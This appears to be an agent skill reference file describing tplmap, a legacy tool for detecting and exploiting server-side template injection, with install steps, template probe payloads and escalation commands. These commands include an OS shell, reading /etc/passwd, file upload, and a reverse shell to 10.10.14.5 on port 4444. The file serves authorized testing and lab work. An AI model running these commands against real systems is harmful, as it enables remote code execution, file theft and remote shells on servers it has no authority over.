---
name: tplmap
description: "Auth/lab ref: classic server-side template injection and code injection detection/exploitation tool for black-box web testing."
license: GPL-3.0
compatibility: "Linux, macOS, WSL; Python environment from repo clone; legacy project with old dependency assumptions."
metadata:
  author: AeonDave
  version: "1.0"
---

# Tplmap

Legacy SSTI and code-injection exploitation tool.

## Important status note

Upstream explicitly marks tplmap as **no longer maintained**. Keep it for:

- legacy labs
- older SSTI writeups and workflows
- historical engine coverage already implemented by tplmap

Prefer `sstimap` for actively maintained modern SSTI work, but keep tplmap available because many operators and challenge environments still reference it directly.

## Quick Start

```bash
git clone https://github.com/epinna/tplmap
cd tplmap
pip install -r requirements.txt

# Probe a reflected parameter
./tplmap.py -u 'http://target/page?name=John'
```

## What tplmap gives you

Once an injection point is confirmed, tplmap can expose capabilities such as:

- OS command execution
- pseudo-shell access
- file read and file write
- upload/download helpers
- reverse shell and bind shell helpers

## Core Workflow

### 1. Start with a suspected SSTI point

Manual confirmation often looks like:

- `{{7*7}}`
- `${7*7}`
- `<%= 7*7 %>`
- `#{7*7}`

If the server evaluates instead of reflecting raw input, hand the endpoint to tplmap.

### 2. Fingerprint the engine

```bash
./tplmap.py -u 'http://target/page?name=John'
```

Upstream shows tplmap identifying:

- vulnerable parameter
- engine
- injection syntax
- context
- OS
- available capabilities

### 3. Escalate

```bash
./tplmap.py --os-shell -u 'http://target/page?name=John'
./tplmap.py --os-cmd 'id' -u 'http://target/page?name=John'
./tplmap.py --download /etc/passwd passwd.txt -u 'http://target/page?name=John'
./tplmap.py --upload local.txt /tmp/remote.txt -u 'http://target/page?name=John'
./tplmap.py --reverse-shell 10.10.14.5 4444 -u 'http://target/page?name=John'
```

## Supported Engine Coverage

Tplmap supports a broad historical set, including:

- Jinja2, Mako, Tornado
- Twig, Smarty
- Freemarker, Velocity
- Pug, Nunjucks, doT, Marko, EJS
- ERB, Slim
- generic eval-like code injection contexts

Upstream also documents important negative cases, such as modern Twig or secured Smarty scenarios where tplmap will not help.

## Practical Notes

- Use tplmap after you already suspect SSTI, not as a replacement for manual probing.
- Keep manual payloads ready for confirmation and fallback when auto-detection misses context-specific quirks.
- Treat results from old writeups carefully; some engine escape chains have changed.
- If tplmap misses a modern target, switch to `sstimap` or manual exploitation.

## Caveats

- Unmaintained upstream.
- Legacy dependencies and assumptions may break on current Python environments.
- Modern engine versions may be unsupported even when the original family is listed.

## Resources

No bundled `scripts/`, `references/`, or `assets/`.
Use upstream README for exact legacy options and engine-specific support notes.
